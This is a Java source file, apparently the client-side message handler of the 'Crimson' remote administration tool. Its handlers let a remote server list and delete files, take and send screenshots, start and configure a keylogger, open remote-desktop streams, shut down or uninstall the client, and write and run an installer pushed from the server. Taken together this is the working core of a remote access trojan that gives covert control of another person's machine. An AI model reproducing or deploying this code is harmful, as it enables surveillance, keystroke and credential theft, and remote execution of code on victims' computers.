/******************************************************************************
 *                                                                            *
 *                    Copyright 2016 Subterranean Security                    *
 *                                                                            *
 *  Licensed under the Apache License, Version 2.0 (the "License");           *
 *  you may not use this file except in compliance with the License.          *
 *  You may obtain a copy of the License at                                   *
 *                                                                            *
 *      http://www.apache.org/licenses/LICENSE-2.0                            *
 *                                                                            *
 *  Unless required by applicable law or agreed to in writing, software       *
 *  distributed under the License is distributed on an "AS IS" BASIS,         *
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  *
 *  See the License for the specific language governing permissions and       *
 *  limitations under the License.                                            *
 *                                                                            *
 *****************************************************************************/
package com.subterranean_security.crimson.client.net;

import java.awt.HeadlessException;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.util.concurrent.TimeUnit;

import javax.imageio.ImageIO;
import javax.security.auth.DestroyFailedException;

import org.jnativehook.NativeHookException;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.google.protobuf.ByteString;
import com.subterranean_security.crimson.client.Client;
import com.subterranean_security.crimson.client.ClientStore;
import com.subterranean_security.crimson.client.modules.Keylogger;
import com.subterranean_security.crimson.client.modules.Power;
import com.subterranean_security.crimson.client.modules.QuickScreenshot;
import com.subterranean_security.crimson.client.stream.CInfoSlave;
import com.subterranean_security.crimson.core.Common;
import com.subterranean_security.crimson.core.net.BasicExecutor;
import com.subterranean_security.crimson.core.net.ConnectionState;
import com.subterranean_security.crimson.core.platform.LocalFS;
import com.subterranean_security.crimson.core.platform.Platform;
import com.subterranean_security.crimson.core.proto.ClientAuth.MI_GroupChallengeResult;
import com.subterranean_security.crimson.core.proto.ClientAuth.RQ_GroupChallenge;
import com.subterranean_security.crimson.core.proto.ClientAuth.RS_GroupChallenge;
import com.subterranean_security.crimson.core.proto.ClientControl.RS_ChangeSetting;
import com.subterranean_security.crimson.core.proto.FileManager.RQ_FileListing;
import com.subterranean_security.crimson.core.proto.FileManager.RS_Delete;
import com.subterranean_security.crimson.core.proto.FileManager.RS_FileHandle;
import com.subterranean_security.crimson.core.proto.FileManager.RS_FileListing;
import com.subterranean_security.crimson.core.proto.Generator.ClientConfig;
import com.subterranean_security.crimson.core.proto.Keylogger.State;
import com.subterranean_security.crimson.core.proto.Log.LogFile;
import com.subterranean_security.crimson.core.proto.Log.LogType;
import com.subterranean_security.crimson.core.proto.Log.RS_Logs;
import com.subterranean_security.crimson.core.proto.MSG.Message;
import com.subterranean_security.crimson.core.proto.Misc.Outcome;
import com.subterranean_security.crimson.core.proto.Screenshot.RS_QuickScreenshot;
import com.subterranean_security.crimson.core.proto.State.RS_ChangeClientState;
import com.subterranean_security.crimson.core.proto.Stream.Param;
import com.subterranean_security.crimson.core.proto.Update.RS_GetClientConfig;
import com.subterranean_security.crimson.core.stream.Stream;
import com.subterranean_security.crimson.core.stream.StreamStore;
import com.subterranean_security.crimson.core.stream.remote.RemoteSlave;
import com.subterranean_security.crimson.core.util.AuthenticationGroup;
import com.subterranean_security.crimson.core.util.CUtil;
import com.subterranean_security.crimson.core.util.Crypto;
import com.subterranean_security.crimson.core.util.HCP;
import com.subterranean_security.crimson.core.util.IDGen;
import com.subterranean_security.crimson.sc.Logsystem;

import io.netty.util.ReferenceCountUtil;

public class ClientExecutor extends BasicExecutor {
	private static final Logger log = LoggerFactory.getLogger(ClientExecutor.class);

	private ClientConnector connector;

	public ClientExecutor(ClientConnector vc) {
		super();
		connector = vc;

		dispatchThread = new Thread(() -> {
			while (!Thread.currentThread().isInterrupted()) {
				Message m;
				try {
					m = connector.mq.take();
				} catch (InterruptedException e) {
					return;
				}

				pool.submit(() -> {
					if (m.hasEvStreamData()) {
						ev_stream_data(m);
					} else if (m.hasEvEndpointClosed()) {
						ev_endpoint_closed(m);
					} else if (m.hasEvChatMessage()) {
						ev_chat_message(m);
					} else if (m.hasRqGroupChallenge()) {
						rq_group_challenge(m);
					} else if (m.hasMiChallengeresult()) {
						challengeResult_1w(m);
					} else if (m.hasRqFileListing()) {
						file_listing_rq(m);
					} else if (m.hasMiAssignCvid()) {
						assign_1w(m);
					} else if (m.hasMiStreamStart()) {
						stream_start_ev(m);
					} else if (m.hasMiStreamStop()) {
						stream_stop_ev(m);
					} else if (m.hasRqChangeClientState()) {
						rq_change_client_state(m);
					} else if (m.hasRqFileHandle()) {
						rq_file_handle(m);
					} else if (m.hasRqAdvancedFileInfo()) {
						rq_advanced_file_info(m);
					} else if (m.hasRqGetClientConfig()) {
						rq_get_client_config(m);
					} else if (m.hasRsGenerate()) {
						rs_generate(m);
					} else if (m.hasRqQuickScreenshot()) {
						rq_quick_screenshot(m);
					} else if (m.hasRqDelete()) {
						rq_delete(m);
					} else if (m.hasRqLogs()) {
						rq_logs(m);
					} else if (m.hasRqChangeSetting()) {
						rq_change_setting(m);
					} else if (m.hasRqChat()) {
						rq_chat(m);
					} else {
						connector.cq.put(m.getId(), m);
					}

					ReferenceCountUtil.release(m);
				});
			}

		});
		dispatchThread.start();

	}

	private void ev_stream_data(Message m) {
		Stream s = StreamStore.getStream(m.getEvStreamData().getStreamID());
		if (s != null) {
			s.received(m);
		}

	}

	private void ev_endpoint_closed(Message m) {
		// remove half-open streams
		StreamStore.removeStreamsByCVID(m.getEvEndpointClosed().getCVID());
	}

	private void ev_chat_message(Message m) {

	}

	private void rq_change_client_state(Message m) {
		log.debug("Received state change request: {}", m.getRqChangeClientState().getNewState().toString());
		Outcome outcome = null;

		switch (m.getRqChangeClientState().getNewState()) {
		case RESTART:
			outcome = Power.restart();
			break;
		case SHUTDOWN:
			outcome = Power.shutdown();
			break;
		case HIBERNATE:
			outcome = Power.hibernate();
			break;
		case STANDBY:
			outcome = Power.standby();
			break;
		case UNINSTALL:
			outcome = Power.uninstall();
			break;
		case RESTART_PROCESS:
			outcome = Power.restartProcess();
			break;
		case KILL:
			outcome = Outcome.newBuilder().setResult(true).build();
			break;

		default:
			return;
		}

		if (outcome != null) {
			connector.handle.write(Message.newBuilder().setId(m.getId()).setRid(m.getSid())
					.setRsChangeClientState(RS_ChangeClientState.newBuilder().setOutcome(outcome)).build());

		}

		if (outcome.getResult()) {
			System.exit(0);
		}

	}

	private void rq_group_challenge(Message m) {
		if (connector.getState() != ConnectionState.AUTH_STAGE1) {
			return;
		}

		AuthenticationGroup group = Client.getGroup();
		final byte[] groupKey = group.getGroupKey();
		try {
			group.destroy();
		} catch (DestroyFailedException e1) {
		}

		String result = Crypto.hashSign(m.getRqGroupChallenge().getMagic(), groupKey);
		RS_GroupChallenge rs = RS_GroupChallenge.newBuilder().setResult(result).build();
		connector.handle.write(Message.newBuilder().setId(m.getId()).setRsGroupChallenge(rs).build());
	}

	private void challengeResult_1w(Message m) {
		if (connector.getState() != ConnectionState.AUTH_STAGE1) {
			return;
		}
		if (!m.getMiChallengeresult().getResult()) {
			log.debug("Authentication with server failed");
			connector.setState(ConnectionState.CONNECTED);
			return;
		} else {
			connector.setState(ConnectionState.AUTH_STAGE2);
		}

		AuthenticationGroup group = Client.getGroup();
		final byte[] groupKey = group.getGroupKey();
		try {
			group.destroy();
		} catch (DestroyFailedException e1) {
		}

		// Send authentication challenge
		final int id = IDGen.get();

		final String magic = CUtil.Misc.randString(64);
		RQ_GroupChallenge rq = RQ_GroupChallenge.newBuilder().setGroupName(group.getName()).setMagic(magic).build();
		connector.handle.write(Message.newBuilder().setId(id).setRqGroupChallenge(rq).build());

		new Thread(new Runnable() {
			public void run() {
				boolean flag = true;
				try {
					Message rs = connector.cq.take(id, 7, TimeUnit.SECONDS);
					if (rs != null) {
						if (!Crypto.verifyGroupChallenge(magic, groupKey, rs.getRsGroupChallenge().getResult())) {
							log.info("Server challenge failed");
							flag = false;
						}

					} else {
						log.debug("No response to challenge");
						flag = false;
					}
				} catch (InterruptedException e) {
					log.debug("No response to challenge");
					flag = false;
				}

				MI_GroupChallengeResult.Builder oneway = MI_GroupChallengeResult.newBuilder().setResult(flag);

				if (flag) {
					connector.setState(ConnectionState.AUTHENTICATED);

					oneway.setPd(Platform.fig());
				} else {
					// TODO handle more
					connector.setState(ConnectionState.CONNECTED);
				}
				connector.handle.write(Message.newBuilder().setId(id).setMiChallengeresult(oneway.build()).build());

			}
		}).start();

	}

	private void file_listing_rq(Message m) {

		RQ_FileListing rq = m.getRqFileListing();
		log.debug("file_listing_rq. fmid: " + rq.getFmid());
		LocalFS lf = ClientStore.LocalFilesystems.get(rq.getFmid());
		if (rq.hasUp() && rq.getUp()) {
			lf.up();
		} else if (rq.hasDown()) {
			if (rq.hasFromRoot() && rq.getFromRoot()) {
				lf.setPath(rq.getDown());
			} else {
				lf.down(rq.getDown());
			}

		}
		try {
			ClientStore.Connections.route(Message.newBuilder().setId(m.getId())
					.setRsFileListing(RS_FileListing.newBuilder().setPath(lf.pwd()).addAllListing(lf.list()))
					.setSid(m.getRid()).setRid(m.getSid()));
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	private void rq_file_handle(Message m) {
		log.debug("rq_file_handle");
		ClientStore.Connections
				.route(Message.newBuilder().setId(m.getId()).setRid(m.getSid()).setSid(m.getRid()).setRsFileHandle(
						RS_FileHandle.newBuilder().setFmid(ClientStore.LocalFilesystems.add(new LocalFS(true, true)))));
	}

	private void rq_advanced_file_info(Message m) {
		log.debug("rq_advance_file_info");
		ClientStore.Connections.route(Message.newBuilder().setId(m.getId()).setRid(m.getSid()).setSid(m.getRid())
				.setRsAdvancedFileInfo(LocalFS.getInfo(m.getRqAdvancedFileInfo().getFile())));
	}

	private void rq_delete(Message m) {
		log.debug("rq_delete");
		ClientStore.Connections.route(Message.newBuilder().setId(m.getId()).setRid(m.getSid()).setSid(m.getRid())
				.setRsDelete(RS_Delete.newBuilder()
						.setOutcome(LocalFS.delete(m.getRqDelete().getTargetList(), m.getRqDelete().getOverwrite()))));
	}

	private void assign_1w(Message m) {
		Common.cvid = m.getMiAssignCvid().getId();
		Client.clientDB.storeObject("cvid", Common.cvid);
	}

	private void stream_start_ev(Message m) {
		log.debug("stream_start_ev");
		Param p = m.getMiStreamStart().getParam();
		if (p.hasInfoParam()) {
			StreamStore.addStream(new CInfoSlave(p));
		}
		if (p.hasRemoteParam()) {
			StreamStore.addStream(new RemoteSlave(p));
		}
	}

	private void stream_stop_ev(Message m) {
		log.debug("stream_stop_ev");
		StreamStore.removeStreamBySID(m.getMiStreamStop().getStreamID());

	}

	private void rq_get_client_config(Message m) {
		ClientStore.Connections.route(Message.newBuilder().setId(m.getId()).setRid(m.getSid()).setSid(Common.cvid)
				.setRsGetClientConfig(RS_GetClientConfig.newBuilder().setConfig(Client.ic)));
	}

	private void rs_generate(Message m) {
		// TODO flush any pending data

		// update client
		File temp = CUtil.Files.Temp.getDir();
		try {
			CUtil.Files.writeFile(m.getRsGenerate().getInstaller().toByteArray(),
					new File(temp.getAbsolutePath() + "/installer.jar"));

			HCP.update(new File(temp.getAbsolutePath() + "/installer.jar").getAbsolutePath(), new String[] {},
					new String[] {}, 2);
			System.exit(0);
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	private void rq_quick_screenshot(Message m) {
		ByteArrayOutputStream baos = new ByteArrayOutputStream();
		try {
			ImageIO.write(QuickScreenshot.snap(), "jpg", baos);
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			return;
		}
		ClientStore.Connections.route(Message.newBuilder().setId(m.getId()).setRid(m.getSid()).setSid(Common.cvid)
				.setRsQuickScreenshot(RS_QuickScreenshot.newBuilder().setBin(ByteString.copyFrom(baos.toByteArray()))));
		try {
			baos.close();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	private void rq_logs(Message m) {
		RS_Logs.Builder rs = RS_Logs.newBuilder();
		if (m.getRqLogs().hasLog()) {
			rs.addLog(LogFile.newBuilder().setName(m.getRqLogs().getLog())
					.setLog(Logsystem.getLog(m.getRqLogs().getLog())));
		} else {
			for (LogType lt : Logsystem.getApplicableLogs()) {
				rs.addLog(LogFile.newBuilder().setName(lt).setLog(Logsystem.getLog(lt)));
			}
		}
		ClientStore.Connections
				.route(Message.newBuilder().setId(m.getId()).setRid(m.getSid()).setSid(Common.cvid).setRsLogs(rs));
	}

	private void rq_change_setting(Message m) {
		Outcome.Builder outcome = Outcome.newBuilder().setResult(true);
		try {
			if (m.getRqChangeSetting().hasKeyloggerState()) {
				if (m.getRqChangeSetting().getKeyloggerState() == State.ONLINE) {
					try {
						Keylogger.start(Client.ic.getKeyloggerFlushMethod(), Client.ic.getKeyloggerFlushValue());
					} catch (HeadlessException e) {
						outcome.setResult(false).setComment("HeadlessException");
						return;
					} catch (NativeHookException e) {
						outcome.setResult(false).setComment(e.getMessage());
						return;
					}
				} else {
					Keylogger.stop();
				}
			}
			if (m.getRqChangeSetting().hasFlushMethod()) {
				Client.ic = ClientConfig.newBuilder().mergeFrom(Client.ic)
						.setKeyloggerFlushMethod(m.getRqChangeSetting().getFlushMethod()).build();
				Client.saveIC();
			}
			if (m.getRqChangeSetting().hasFlushValue()) {
				Client.ic = ClientConfig.newBuilder().mergeFrom(Client.ic)
						.setKeyloggerFlushValue(m.getRqChangeSetting().getFlushValue()).build();
				Client.saveIC();
			}
			if (m.getRqChangeSetting().hasFlushMethod() || m.getRqChangeSetting().hasFlushValue()) {
				try {
					Keylogger.start(Client.ic.getKeyloggerFlushMethod(), Client.ic.getKeyloggerFlushValue());
				} catch (HeadlessException e) {
					outcome.setResult(false).setComment("HeadlessException");
					return;
				} catch (NativeHookException e) {
					outcome.setResult(false).setComment(e.getMessage());
					return;
				}
			}
		} finally {
			ClientStore.Connections.route(Message.newBuilder().setId(m.getId()).setRid(m.getSid()).setSid(Common.cvid)
					.setRsChangeSetting(RS_ChangeSetting.newBuilder().setResult(outcome)));
		}

	}

	private void rq_chat(Message m) {
		// TODO handle
	}

}
